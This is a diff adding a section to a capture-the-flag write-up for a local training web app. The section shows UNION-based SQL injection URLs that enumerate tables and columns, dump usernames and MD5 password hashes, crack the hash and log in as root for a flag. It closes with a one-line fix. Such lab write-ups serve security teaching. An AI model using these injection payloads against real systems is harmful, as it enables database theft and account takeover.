@@ -38,5 +38,23 @@ It decodes as `albatroz`: https://md5.gromweb.com/?md5=1928e8083cf461a5130363309
 sha256(`albatroz`) =>
 Flag: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
 
+## Table db_default
+With the following link above we find that there is a database called `Member_Brute_Force` with table called `db_default`:
+http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_schema%2C+table_name+FROM+information_schema.tables&Submit=Submit#
+
+With the following query we find that the table has 3 columns: `id, username, password`:
+http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
+
+With the following query we can get a list of users with their usernamd and password:
+`1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default`
+(http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+username%2C+password+FROM+Member_Brute_Force.db_default&Submit=Submit#)
+
+2 accounts: `root, admin`. Both have the same password hash `3bf1114a986ba87ed28fc1b5884fc2f8`.
+`reverseMD5('3bf1114a986ba87ed28fc1b5884fc2f8')` == shadow
+(https://md5.gromweb.com/?md5=3bf1114a986ba87ed28fc1b5884fc2f8)
+
+Log in using the form to get a flag:
+http://192.168.99.100/index.php?page=signin&username=root&password=shadow&Login=Login#
+
 # How to fix
 Use prepared statements or escape database input.
